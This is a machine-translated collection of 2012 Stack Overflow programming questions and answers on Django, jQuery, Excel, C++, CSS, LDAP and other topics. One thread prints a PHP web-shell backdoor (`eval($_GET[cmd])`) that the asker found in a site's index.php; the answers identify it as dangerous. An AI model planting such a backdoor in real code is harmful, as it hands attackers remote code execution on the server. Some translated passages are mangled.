或者更笼统地说：跟踪 Github（或任何其他托管）项目的版本更改（当然是以人类可读的格式）并以更愉快的方式将其封装到项目本身中的最佳方式是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:23:26.183

Github 有里程碑问题。

如果您将发布与里程碑链接，**所有**更改与票证，那么：*里程碑中所有已关闭的票证*将形成人类可读的变更日志

# javascript - 我的 Django 和 jQuery AJAX 表单提交设置有什么问题？

> ID：13418172
> 
> 赞同：2
> 
> 时间：2012-11-16T14:05:04.370
> 
> 标签：javascript, jquery, python, ajax, django

我知道，您已经阅读过这样的问题一千次甚至更多次，我也阅读过这些问题及其答案，但我根本无法让我的 AJAX 表单在客户端使用 jQuery 和在服务器上使用 Django 正常工作边。此外，我无法为像我这样的 Python 人和 JavaScript 新手找到一个愚蠢的简单分步教程，该教程易于理解且详细到足以给我一个我急切等待的 aha 时刻。

我在 HTML 页面上有一个表单，当单击提交按钮时，`HttpResponse`应该使用 JavaScript 的`alert()`功能简单地提醒相应的人，但它不起作用。当我提交表单时，我在 Django 的开发服务器控制台中找到以下条目：

```
"POST /ajaxtest/%5Bobject%20Object%5D HTTP/1.1" 404 2381 
```

请告诉我我的代码有什么问题。非常感谢您！

**表格.py**

```
from django.db import forms

class AjaxTestForm(forms.Form):
    first_name = forms.CharField()
    last_name = forms.CharField() 
```

**视图.py**

```
from django.http import HttpResponse
from django.shortcuts import render
from my_app.forms import AjaxTestForm

def ajax_test(request):
    if request.is_ajax() and request.method == 'POST':
        form = AjaxTestForm(request.POST)
        if form.is_valid():
            print request.POST
            # I want this to be alerted
            return HttpResponse('Your AJAX form test was successful!')
        else:
            return HttpResponse('Your AJAX form test failed miserably!')
    else:
        form = AjaxTestForm()

    return render(request, 'ajaxtest.html', {'form': form}) 
```

**网址.py**

```
from django.conf.urls import patterns, url
from my_app.views import ajax_test

urlpatterns = patterns('',
    url(r'^ajaxtest/$', ajax_test, name='ajax-test-page')
) 
```

**ajaxtest.html**

```
<!DOCTYPE html>
<html>
<head>
    <script src="{{ STATIC_URL }}js/jquery-1.8.2.min.js"></script>

    <script>

        $(document).ready(function() {

            $('#ajaxform').submit(function(event) {

                var $form = $(this);
                var serializedData = $form.serialize();

                $.post({
                    url: '/ajaxtest/',
                    data: serializedData,
                    success: function(response) {
                        alert(response);
                    }
                });

                event.preventDefault();

            });
        });

    </script>
</head>

<body>
    <form id="ajaxform" method="post" accept-charset="UTF-8" action="">{% csrf_token %}

        <fieldset>
            {% for field in form %}
                <label for="{{ field.label }}">{{ field.label }}</label>
                <input id="{{ field.label }}" type="text" name="{{ field.html_name }}" />
            {% endfor %}

            <button type="submit">Submit</button>
        </fieldset>

    </form>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-16T14:21:23.470

线索在控制台中：它显示它正在附加`[object Object]`到它要发布到的 URL。我怀疑这是您传递给`$.post`函数的整个对象的表示。

这是因为与`$.ajax`函数不同，`$.post`它不接受对象，它接受单独的参数。所以你的代码应该是：

```
$.post('/ajaxtest/', serializedData, function(response) {
   alert(response);
}); 
```

# jquery - jQuery UI 导致“未捕获”错误

> ID：13418173
> 
> 赞同：0
> 
> 时间：2012-11-16T14:05:05.650
> 
> 标签：jquery, jquery-ui

我想在我的网站上使用 jQuery UI。我下载了自定义版本，但它不起作用。所以我使用了他们网站上的“完整”版本。它也不起作用。

我唯一的代码是：

```
$('#gameRelease').datepicker(); 
```

我得到的是控制台中的错误：

```
Uncaught TypeError: Cannot read property 'fadeIn' of undefined 
```

我能做些什么？

- 编辑 -

好吧，这变得很奇怪。

*   我在 jQuery UI 之前**包含了 jQuery。**
*   在我的代码之前，我还有其他使用 jQuery 的东西，它们运行良好。
*   我尝试禁用其他插件并评论我以前的代码 - 没有任何效果。

这是我的完整代码（我删掉了不重要的部分）：

**JS**

```
(function($){})(window.jQuery);
$(document).ready(function() {
    /* jQuery UI */
    $('#gameRelease').datepicker();
}) 
```

**HTML**

```
<script src="/js/modernizr-1.7.min.js"></script>

<script src="//code.jquery.com/jquery-latest.min.js"></script>
<script src="/js/jquery-ui-1.9.1.custom.min.js"></script>
<script src="/js/script.js"></script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-20T11:58:15.897

愚蠢的问题。事实证明，您必须在 jQuery 之后立即加载 jQueryUI。后来我加载了它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-26T09:13:58.507

WordPress (0.2)的插件*Nivo Slider*`jquery.effects.core.js`加载它自己的文件，这也使得 datepicker 抛出相同的错误。

如果禁用插件使日期选择器工作，那么您必须编辑`nivoslider4wp-show.php`文件。找到带有 的行`<script ... src=".../js/jquery.effects.core.js" ...`，并使用 HTML 注释 ( `<!-- ... -->`) 将其注释掉。

# excel - 在 Excel 中，有什么方法可以将时间单元快速提前一分钟？

> ID：13418175
> 
> 赞同：0
> 
> 时间：2012-11-16T14:05:13.447
> 
> 标签：excel, excel-2010

例如，假设单元格 A1 的值为 11:37:00 PM（显示为 23:37）。我想单击单元格并立即将其推进到晚上 11:38:00（显示为 23:38）。不得不删除并将新的时间值输入到顶部的区域中，这很烦人。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T14:32:56.563

这将使您能够单击 A 列中的任何单元格并添加 1 分钟。将此子添加到要添加分钟的工作表中。

```
Private Sub Worksheet_SelectionChange(ByVal Target As Range)
    If Target.Column = 1 Then 'edit this to change a different column
        Cells(Target.Row, Target.Column).Value = Cells(Target.Row, Target.Column) + TimeValue("00:01:00")
    End If
End Sub 
```

**额外的**

如果您有日期并且不想更新日期，请使用它。

```
Private Sub Worksheet_SelectionChange(ByVal Target As Range)
    If Target.Column = 1 Then 'edit this to change a different column
        var = DateValue(Cells(Target.Row, Target.Column).Value)
        Cells(Target.Row, Target.Column).Value = Cells(Target.Row, Target.Column) + TimeValue("00:01:00")
        var2 = DateValue(Cells(Target.Row, Target.Column).Value)
        If var <> var2 Then
            Cells(Target.Row, Target.Column).Value = Cells(Target.Row, Target.Column).Value - 1
        End If
    End If
End Sub 
```

# c++ - 手动释放 ComPtr

> ID：13418176
> 
> 赞同：8
> 
> 时间：2012-11-16T14:05:15.377
> 
> 标签：c++, com

我正在使用 ComPtr (Microsoft::WRL) 来管理一些 DirectX11 资源。我怎样才能手动释放它？

如果我理解正确，“ReleaseAndGetAddressOf”方法只会释放指针而不是资源本身（返回），我不确定“重置”方法。

我能想到的唯一选择是手动调用指针析构函数，或者在从“ReleaseAndGetAddressOf”获取原始指针之后调用“Release”，我想避免这种情况。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-11-16T14:49:43.653

提供了 WRL 的源代码，请查看 include/winrt/wrl/client.h。嵌入的 COM 指针（ptr_ 成员）由 InternalRelease() 函数释放。使以下任何一种方式释放指针合适的候选人：

*   析构函数。使用 ComPtr<> 的原因
*   分配 nullptr
*   使用 ReleaseAndGetAddressOf()，很长的路要走
*   调用 Reset()

因此，分配 nullptr 或调用 Reset() 是一个不错的选择，请自行选择。或者如果您只想自己管理接口指针，则根本不使用它，当然不需要使用ComPtr。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-16T14:27:38.027

您可以分配一个空指针。

# typo3 - TYPO3 | 仅当不等于 value 时才换行

> ID：13418177
> 
> 赞同：3
> 
> 时间：2012-11-16T14:05:16.180
> 
> 标签：typo3, typoscript

我正在使用以下 TS 自定义我的标题标签以将网站名称附加到页面标题。

（页面标题 - 站点名称）。

```
config.noPageTitle = 2
page.headerData.5 = TEXT
page.headerData.5.field = subtitle // title
page.headerData.5.wrap = <title>| - Site Name</title> 
```

我的问题是我不希望它出现在主页上，因为那里的页面标题与我的站点名称相同。（所以它说站点名称 - 站点名称）。

我的主页是树根，其他页面都在它下面。我只想为主页省略此条件。

我正在寻找这样的条件，

```
WRAP ONLY IF NOT EQUALS 'Site Name' 
```

我怎样才能做到这一点。有任何想法吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-16T14:29:50.270

从 Typo3 邮件列表中得到答案。那里有很棒的支持。

万一有人需要，就在这里。

```
[globalVar = TSFE:id = 10]
page.headerData.5.wrap = <title>|</title>
[else]
page.headerData.5.wrap = <title>| - Site Name</title>
[end] 
```

现在只需将 10 更改为您的主页 ID

# c++ - c++数学库pow()函数的时间复杂度？

> ID：13418180
> 
> 赞同：25
> 
> 时间：2012-11-16T14:05:23.493
> 
> 标签：c++, time-complexity

我想知道在 c++ 中构建的 pow() 函数的最坏情况下的时间复杂度是多少？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-11-16T14:10:11.403

这取决于底层架构。在最常见的桌面架构 x86 上，这是一个恒定时间操作。

有关如何在 x86 上实现它的更多详细信息，请参阅此问题：[How to: pow(real, real) in x86](https://stackoverflow.com/questions/4638473/how-to-powreal-real-in-x86)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-16T14:10:46.727

这是[一个实现](http://www.netlib.org/fdlibm/e_pow.c)，看看。可以肯定的是，这是一段相当复杂的代码，有 19 种特殊情况。时间复杂度似乎不依赖于传入的值。

以下是用于计算 的方法的简短描述`pow(x,y)`：

> ```
> Method:  Let `x =  2 * (1+f)` 
> ```
> 
> *   计算并分两部分返回`log2(x)`： `log2(x) = w1 + w2`，其中`w1`有`53-24 = 29`位尾随零。
>     
>     
> *   `y*log2(x) = n+y'`通过模拟多精度算术来执行，其中`|y'|<=0.5`.
>     
>     
> *   返回`x**y = 2**n*exp(y'*log2)`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-16T14:21:59.517

你没有提到你使用的是什么系统/架构，所以我们只能猜测。

但是，**如果您不是在寻找细节而只想浏览**免费提供的实现代码，**请参见** [http://www.netlib.org/fdlibm/](http://www.netlib.org/fdlibm/)，特别是[http://www.netlib.org/fdlibm/w_pow 。C](http://www.netlib.org/fdlibm/w_pow.c)

有关更多背景信息，请参阅此问题的答案：[https ://stackoverflow.com/a/2285277/25882](https://stackoverflow.com/a/2285277/25882)

# eclipse - 用于 JUnit 测试的 Eclipse 签出 SVN

> ID：13418188
> 
> 赞同：0
> 
> 时间：2012-11-16T14:05:59.673
> 
> 标签：eclipse, unit-testing, svn, maven, junit

我正在使用 Eclipse Juno。我导入了一个 SVN (Subversion) 项目。我正在尝试对模块上的 java 类进行单元测试。我正在使用 Java 透视图。

构建路径库有 Junit4。

我有这个问题：

1.  当我添加一个新的 JUnit 测试用例时，“被测类”的文本框出现“当前项目中不存在被测类”的错误。但是我只是右键单击要测试的 java 类并添加新的 JUnit 测试用例。所以基本上出现的错误没有任何意义。因为被测类存在。

2.  从 SVN 导入的现有 Java 测试类中没有“作为 JUnit 测试运行”。如果我右键单击测试类 > 运行方式 > 仅运行配置 ***没有 Junit 测试

Eclipse 设置是默认设置，但以下设置除外：

在 Window> Preferences > Java> Installed JRE > Jdk 1.7 in Window> Preferences > Maven > Installtion > Maven 3.0.4 (External)

请帮助我，将我视为单元测试和 SVN 项目的新手。我不知道该怎么做。

谁能教我如何从 SVN 项目的测试类创建一个 Junit 测试用例。您还可以指示正确的 Eclipse 设置吗？（文件和说明）

提前致谢。

![错误图像](../Images/04f607266462fcb781e7db7dcbed8d58.png) ![错误图像 2](../Images/42ec354e2022d941b411ef416e991571.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:52:08.683

将 JUnit 添加到您的构建路径中，它将解决您的部分或全部问题。我刚刚在 Indigo 上对此进行了测试，尽管我无法重新创建您的第一个问题。

# java - 完全加载后如何获取页面内容？

> ID：13418191
> 
> 赞同：0
> 
> 时间：2012-11-16T14:06:14.267
> 
> 标签：java, javascript, html, apache-commons-httpclient

我有一个网页，我需要将其内容作为字符串获取。

部分内容在页面完全加载后通过 javascript 加载。

正在做

```
URL url = new URL("http:example.com/");
URLConnection con = url.openConnection();
InputStream is = con.getInputStream(); 
```

将无法工作，因为我无法获取稍后加载的内容。

关于我如何实现这一目标的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:13:14.723

它不起作用，因为内容稍后加载，它不起作用，因为没有执行 javascript。您需要一个 javascript 引擎（通常是浏览器）来执行此操作，而您的设置中没有该引擎。

如果你真的想要，你可以嵌入某种浏览器，但你可能不会。根据用例，可能会有更简单的替代方案。

# android - 在android中调整媒体播放器的大小

> ID：13418192
> 
> 赞同：1
> 
> 时间：2012-11-16T14:06:17.700
> 
> 标签：android, media-player

我已经创建了包含带有 SurfaceView 的默认 android 媒体播放器的应用程序。我可以调整 Video 的大小，但不能调整媒体播放器的大小以修改高度和播放/暂停按钮。在那我有2个疑问。

1.  我是否可以膨胀任何自定义布局来替换该默认媒体播放器。
2.  是否可以将 MediaController 转换为 View 或 ViewGroup 。否则，是否有可能在代码中为 mediaController 设置布局参数（）而不是在 xml 中？

有人有想法吗？

请帮我！。

提前致谢。

问候，蒂洛格。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:28:48.180

您可以使用代表播放、停止和暂停（例如）按钮的布局。您只需将其放在底部的布局中即可。我不太了解你，但这会做的工作......

# android - 如何从 Android 应用程序发布 Facebook 应用程序页面的评论/提要？

> ID：13418193
> 
> 赞同：1
> 
> 时间：2012-11-16T14:06:21.200
> 
> 标签：android, facebook, facebook-graph-api

我在实现在 facebook 应用程序页面上发布评论/提要的功能时感到很糟糕。我实现了在自己的墙上发布评论，即通过应用程序登录到 Facebook 的用户。我浏览了developers.facebook.com 网站以了解发布过程。但未能应用所有 url 过程，因为我无法将虚拟站点添加到 App Domain。请分享有关**“如何从 android 应用程序发布 Facebook 应用程序页面的评论/提要”问题的信息？**

# php - 恶意 Javascript 代码？

> ID：13418194
> 
> 赞同：-1
> 
> 时间：2012-11-16T14:06:23.273
> 
> 标签：php, javascript, eval

我在我的网站 index.php 中找到了这段代码

```
<script type="text/javascript">
  new.track("new.dev","_browser","'<?php eval($_GET[cmd]); ?>', '<?php eval($_GET[cmd]);?>'");
  new.track("new.dev","_url",location.href);
</script> 
```

那个代码是恶意的吗？从网络上，我尝试输入 index.php?cmd=ls 之类的东西，但什么也没出现。也许它需要在页面上？我试图了解以前的管理员在现场做什么。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-16T14:09:05.780

该代码中存在无穷无尽的风险。eval() 运行 php 命令并且可以运行终端命令。如果您在没有卫生条件的情况下接受输入，那么有人可能会发疯并在那里造成严重伤害。我会立即删除它并找到更好的方法。

**也把写它的那个人搞砸了。**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:09:41.470

1) 引用`cmd`=>`$_GET['cmd']`

2）绝对允许任何用户在您的服务器上执行任何一段 php 代码。不过，get 请求默认限制为 8kb（限制可能会更改）

你正在做的事情非常危险。我不确定您想要完成什么，但请相信我并找到不同的方式。

# expressionengine - {exp:store:checkout} 已停止工作

> ID：13418197
> 
> 赞同：2
> 
> 时间：2012-11-16T14:06:28.207
> 
> 标签：expressionengine, expresso-store

{exp:store:checkout} 标签已停止工作。

* * *

**它能做什么**

当您继续下一步或“提交”结帐标签时，它会重新加载页面并返回到开头

* * *

**它应该做什么**

转到下一阶段或支付提供商（取决于步骤）

* * *

**作出的诊断**

认为它可能是我们的模板，我们查看了包含的示例商店示例模板。那里也发生了同样的问题。

该站点确实如此，直到最近才起作用，据我所知没有任何更改。一周内没有销售。

* * *

**软件**

我们正在运行 EE 2.5.2 和 Store 1.5.3。我们尝试升级到 1.6.2 但出现以下错误。他们可能有关系吗？[http://pastebin.com/JqTLdTX6](http://pastebin.com/JqTLdTX6)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:30:59.860

**这已解决**

我们的 .htaccess 文件中有以下内容。

```
## ENSURE THAT THERE IS ALWAYS A TRAILING SLASH ##
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^(.*)([^/])$        /$1$2/ [L,R=301] 
```

这搞砸了表单的提交方式。

很抱歉给您带来不便。

（对于它的价值，PHP 错误仍然存​​在）。

# java - 为什么原始类型有一个“类”，它是如何使用的？

> ID：13418202
> 
> 赞同：3
> 
> 时间：2012-11-16T14:06:41.667
> 
> 标签：java, types

谈到 Java (7)，您可以获得一个原始类型的类，如下所示：

```
Class classOfInt = int.class 
```

对于每一个，你都会得到一个名为原始类型的“类”：

```
int.class    --> int
byte.class   --> byte
double.class --> double
... 
```

但是，您不能创建这些实例：

```
char.class.newInstance(); // throws 'InstantiationException' 
```

似乎它们的类没有映射到相应的包装类（`Integer`,`Byte`等）。

那么为什么它们有“类”，它们是如何使用的，又是如何实现的呢？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-16T14:12:40.600

它们用于反射。

```
Method round = Math.class.getMethod("round", double.class);
System.out.println(Arrays.toString(round.getParameterTypes()));
System.out.println(round.getReturnType() == long.class);

Method exit = System.class.getMethod("exit", int.class);
System.out.println(Arrays.toString(exit.getParameterTypes()));
System.out.println(exit.getReturnType() == void.class); 
```

印刷

```
[double]
true
[int]
true 
```

> 它们是如何实施的？

它们是 JVM 内置的，没有定义它们的类文件。

# javascript - IE 换行问题上的拆分字符串

> ID：13418206
> 
> 赞同：0
> 
> 时间：2012-11-16T14:06:51.193
> 
> 标签：javascript, internet-explorer

我正在使用此代码来检测字符串中的新行。

```
var result = str.split(/\r\n|\r|\n/g); 
```

但是，在 IE8 中，如果仅在第一次出现连续的新行，则字符串会被拆分。

例子：

```
Hello
  ...\n
people 
```

被视为

```
Hello
people 
```

感谢任何解决方案或建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T14:35:09.117

在旧版本的 IE（IE8 和更早版本）中存在一个已知错误，其中`split()`删除了空元素——这正是您报告的问题。

此错误已在 IE9 中修复，但如果您需要支持任何比该版本更早的 IE 版本，那么您将遇到此问题。

解决这个错误真的很不容易。我见过有人建议完全[覆盖该`split()`功能](http://blog.stevenlevithan.com/archives/cross-browser-split)，但这似乎有点矫枉过正（并且可能产生意想不到的副作用）。

当我过去遇到这个问题时，我最终确保我的字段总是有一个值，即使它是空白的。对于空白字段，我将它们设置为空格或零，或者稍后我可以删除的标记字符。不确定该解决方案在此示例中对您有多大用处，但这就是我所做的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T14:51:11.590

我认为有一个解决方法，`replace(separator, '\0')`先使用然后`split('\0')`不完美但有效。

*例子*

```
'a||b'.replace(/\|/g, '\0').split('\0'); // => ['a', '', 'b']; 
```

并将其用作拆分的修复方法，似乎比 SDC 的答案中建议的更好（不是标准的，而是简单的并修复了空元素消除问题）。你可以把它放在评论中。

```
<!--[if IE lt 9]><script type="text/javascript">
(function(orgSplit) {
  String.prototype.split = function(seperator, limit) {
    if (seperator instanceof RegExp)
      return this.replace(seperator, '\0').split('\0', limit);
    else
      return orgSplit.call(this, seperator, limit);
  };
})(String.prototype.split);
</script><![endif]--> 
```

# html - html css 布局，标题 div 的高度未知，而 body div 可以填充剩余空间吗？

> ID：13418216
> 
> 赞同：3
> 
> 时间：2012-11-16T14:07:19.117
> 
> 标签：html, css

我想要一个 html/css 布局，它有一个 div#header 和 div#body 作为 body 标记的直接子级。我希望 div#body 填充剩余空间，并且我不想使用 JavaScript。我知道如果你知道 div#header 的确切高度是可能的。但我不想解决这个问题。

固定 div#header 的示例

```
<head>
    <style>
        html, body {
            position: relative;
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
        }

        div {
            width: 100%;
        }
        #header {
            position: relative;
            <!-- i want to remove height because i want the header to size itself 
                 dependent on it's content -->
            height: 100px;
            background-color: red;
        }

        #body {
            <!-- I want to make the body position relative and set top to 0 
                 but that does not work as expected.-->
            position: absolute;
            top: 100px;

            margin: 0;
            bottom: 0;
            background-color: green;
            height: auto;
        }
    </style>
</head>

<body>
    <div id="header">header</div>
    <div id="body">body</div>
</body> 
```

请让我知道是否有任何使用 div 和 css 的替代方案。提前谢谢了！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T15:01:01.870

这是更新的答案：我所做的是**让父 html 和 body 显示为表格**，其他**div 具有表格行的属性，**这个 css 将使它们捕获整个屏幕区域。

> **现在我已经给出了 auto 的标题高度。**

和

> **#body 正在继承另一个空间。**

试试这个：http: [//jsbin.com/ezozeb/5/edit](http://jsbin.com/ezozeb/5/edit)

```
html, body {
   margin: 0;
   padding: 0;
   width: 100%;
   height: 100%;
   display:table;
}

#header {
  background-color: red;
  display:table-row;
  height:auto;
}
#body {
  background-color: green;
  display:table-row;
  height:inherit;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-16T14:17:52.180

您可以将`min-height`body div 的 设置`100%`为伸展 body div（我更改了 body bg 颜色以使其更明显）。

但是，我对您的第二个要求不是 100% 清楚 ( `<!-- I want to make the body position relative and set top to 0 but that does not work as expected.-->`)

[在这里提琴](http://jsfiddle.net/6ESH7/1/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-16T14:17:51.827

首先，删除body元素的高度和宽度。

您可以使用页面包装器来实现这一点：

```
#PageWrapper
{
  width: 844px;
  background-color: ##4628C4;
  margin: auto;
}

#PageContentWrapper
{
  width: 659px;
  float: left;
  background-color: #e1e1e1;
  min-height: 500px;
  padding: 10px;
} 
```

pagecontentwrapper 将最小高度设置为 500px。然后在 html 中，您可以将这些标识符分配给 body 和 div

```
<html>
  <head>
    <link...>
  </head>
  <body id="PageWrapper">

    <div id="PageContentWrapper">
      Content of the body
    </div>
   </body>
</html> 
```

如果要使 div 可滚动，则应定义高度和/或宽度并将其添加到 css：

```
overflow-x:auto; <!--horizontal-->
overflow-y:auto; <!--vertical--> 
```

例如，如果您将 pagewrappers 的高度设置为 1000（不是 min-heigt）并且 overflow-y: auto; 然后当内容超出范围时会出现滚动条。

如果你想让标题总是在顶部，你应该应用这样的东西：

```
#PageWrapper
{
  width: 844px;
  background-color: ##4628C4;
  margin: auto;
}

#Header
{
  background-color:#aaaaaa;
  width: 844px;
  height: 240px;
}

#PageContentWrapper
{
  width: 659px;
  height: 700px;
  overflow-y: auto;
  float: left;
  background-color: #e1e1e1;

  padding: 10px;
} 
```

并在 html

```
<html>
  <head>
    <link...>
  </head>
<body id="PageWrapper">
  <div id=Header>
    Headertext
  </div>  
  <div id="PageContentWrapper">
    Content of the body
  </div>
</body>
</html> 
```

# c++ - ldap_search 函数使用 c++ Win32 api 返回错误代码 10？

> ID：13418222
> 
> 赞同：1
> 
> 时间：2012-11-16T14:07:36.657
> 
> 标签：c++, windows, winapi, active-directory, ldap

我正在使用 ldap 函数来使用 win32 api 获取用户属性值。

用户名是`arun`。

在像 init、set_options、connect、bind 这样的 ldap_functions 中是成功的。但是 ldap 搜索函数返回错误代码 10。

这是我的代码

```
errorCode = ldap_search_s(
                    pLdapConnection,    // Session handle
                    pMyDN,              // DN to start search
                    LDAP_SCOPE_SUBTREE, // Scope  LDAP_SCOPE_BASE LDAP_SCOPE_SUBTREE
                    pMyFilter,          // Filter
                    NULL,               // Retrieve list of attributes
                    0,                  // Get both attributes and values
                    &pSearchResult); 
```

在`pMyDN`指定的`"DC=SANJU,DC=CO,DC=IN"...

返回代码 10 给出的错误是`LDAP_REFERRAL`。但我无法得到它。

但我把`pMyDN`价值投入`"OU=Marketing,DC=SANJU,DC=CO,DC=IN"`

现在，搜索功能成功了，那么问题出在哪里？

我需要这个功能而不使用OU，有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T14:15:58.960

LDAP_REFERRAL：如果给定的基本 DN 是当前服务器未处理的条目并且引用 URL 标识了不同的服务器来处理该条目，则由 Directory Server 发送。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T04:56:29.457

如果DNS和AD在不同的URL（IP）中没有可信规则，就会出现这个问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-17T10:29:31.987

LDAP 响应不使用`error codes`，他们使用`result codes`- 之所以这么称呼是因为非零响应不一定是错误。10就是一个例子，它是一个推荐。引用将包含有关可以处理请求的服务器的信息。如果没有目录代理服务器来跟踪引用，则 LDAP 客户端必须自己跟踪引用。

比较操作响应也使用结果代码来传输比较结果。

# php - 改变值，给定一个数字并从数组中获取值我希望有人可以帮助我，我要提前感谢大家的帮助。我有一个 php 代码，它以这种方式在一个数组中收集信息： $array_pages[$index][0]: menu id (它告诉我可以在哪个菜单中找到页面) $array_pages[$index][1] ：这里我存储页面名称（不带扩展名） $array_pages[$index][2] ：该字段包含一个字符串（包含有关页面的更多信息） 这个多维数组已经由我的代码构建。这是我想做的：在页面的末尾（我有

> ID：13418224
> 
> 赞同：2
> 
> 时间：2012-11-16T14:07:54.363
> 
> 标签：php, javascript, select

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:14:09.980

这里具有挑战性的部分是 JavaScript 和 PHP 之间的相互作用。一旦页面被渲染并发送到浏览器，PHP 代码就完成了。其他一切都必须在 JavaScript 中完成（除非您正在执行某种回发或 AJAX 模型）。

因此，您必须在 PHP 完成之前使所有值对 JavaScript 代码完全可用。有两种方法可以做到这一点：

1.  使用 PHP创建所有可能的秒`<select>`，但隐藏所有它们 ( `style=display:none`)。然后 JavaScript 将根据第一个菜单中的选择显示/隐藏适当的第二个菜单。
2.  Create a JavaScript array from the PHP array that JavaScript can use to populate the second submenu dynamically when the first menu option is selected.

第一个选项可能更简单，代价是在响应中包含额外的 HTML 膨胀（如果您只有几个子菜单，这应该没什么大不了的）。因此，您将拥有以下内容：

```
<select name='themenu' style='width: 150px' onchange='changesubmenu(this)'>
  <option value='1'> Menu number 1 </option>
  <option value='2'> Menu number 2 </option>
  <option value='3'> Menu number 3 </option>
</select>
<select id="thepages1" style="display:none">
  <option>...</option>
  <option>...</option>
  <option>...</option>
</select>
<select id="thepages2" style="display:none">
  <option>...</option>
  <option>...</option>
  <option>...</option>
</select>
<select id="thepages3" style="display:none">
  <option>...</option>
  <option>...</option>
  <option>...</option>
</select> 
```

你的`changesubmenu()`JavaScript 函数看起来像这样：

```
var tempid=''; // save previous id to hide it

function changesubmenu(parent) {
    // get selected menu id
    var id = parent.value;
    var submenuid = "thepages"+id;

    // show the selected menu
    var submenuel = document.getElementById(submenuid);
    if (submenuel) submenuel.style.display = "";

    // hide the previously selected menu
    var oldsubmenuid = "thepages"+tempid;
    var oldsubmenuel = document.getElementById(oldsubmenuid);
    if (oldsubmenuel) oldsubmenuel.style.display = "none";

    // update old id for reference
    tempid = id;
}​ 
```

演示：http: [//jsfiddle.net/NmKvK/](http://jsfiddle.net/NmKvK/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:15:16.167

根据我的经验，使用 javascript 的最佳方法是将所有可能性加载到仅显示您选择的页面上（使用 javascript）。

例如

```
select 1
select 2 hidden
select 3 hideen 
```

在选择 1 您选择了选项 1

```
select 1
select 2 showing
select 3 hidden 
```

在选择 1 您选择了选项 1

```
select 1
select 2 hidden
select 3 showing 
```

如果您有很多内容，那么您需要使用 ajax 和第二个 php 页面动态执行此操作（或者您可以使用相同的 php 文件）。

因此，选择选项1时，它会触发一个ajax调用（带有选项1值的参数），该呼叫将content.php的内容加载到javaScript变量中，然后从那里加载它，然后在第一个之后将其加载到一个座位上选择。

希望这可以帮助！

# c# - C#/ VB.NET 中的缩略图

> ID：13418230
> 
> 赞同：1
> 
> 时间：2012-11-16T14:08:14.127
> 
> 标签：c#, .net, windows, thumbnails

我正在查看[以下](https://stackoverflow.com/questions/1439719/c-sharp-get-thumbnail-from-file-via-windows-api)问题并接受了答案。如果你注意到有这样一行代码：

```
ShellFile shellFile = ShellFile.FromFilePath(pathToYourFile); 
```

这一行给了我一个错误，说它是一个未定义的类型，我需要包含一个 dll 才能让它工作吗？有谁知道是哪一个？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T14:09:24.307

这是 Windows API 代码包的一部分，您可以在 NuGet 上找到它。

# oop - 设计程序 OOP 结构的工具

> ID：13418235
> 
> 赞同：3
> 
> 时间：2012-11-16T14:08:47.973
> 
> 标签：oop, visualization

是否有在线或离线工具允许您创建和可视化 OOP 结构，以便您可以在编码之前规划您的软件？

我正在寻找可以让我布置所有类并放入方法名称和属性名称的东西，这样我就可以立即查看整个设计，并在实际开始编写之前看看可以改进的地方所有这些代码。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-16T14:11:24.277

有很多这样的工具，有些是免费的，有些非常昂贵。如果你生活在微软的世界里，Visual Studio 自带了很棒的设计师。否则在您最喜欢的搜索引擎上搜索“UML 建模工具”...

# php - 使用php在mysql中导入jsonp

> ID：13418239
> 
> 赞同：0
> 
> 时间：2012-11-16T14:09:08.663
> 
> 标签：php, mysql, jsonp

如何在不配置表的情况下以最简单的方式使用 PHP 在 MySQL 表中导入 jsonp 文件？

如果有任何现有的系统更好。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:11:36.610

您可以只获取 json 字符串并将`serialize(json_decode($jsonstring))`其存储在数据库的单个列中以保留整个数组或对象及其结构，然后从您刚刚执行的查询中使用它`unserialize()`以将其转换回其原始状态。

# c# - Xaml 中是否存在与 jQuery 砌体等效的方法/技术？

> ID：13418244
> 
> 赞同：1
> 
> 时间：2012-11-16T14:09:23.097
> 
> 标签：c#, jquery, xaml

我对 Xaml 比较陌生，我发现我既喜欢又讨厌它。它可以做很多事情，但有时也很难做一些应该简单的事情。当然，这也可能与缺乏经验有关。:)

无论如何，在我尝试写一些东西之前，我想弄清楚是否有一种经过验证的方法可以根据 Xaml 中的屏幕/窗口大小排列显示的对象/图块/div 区域。

不是necc，这是我的代码问题，就像有人能指出我正确的方向一样。

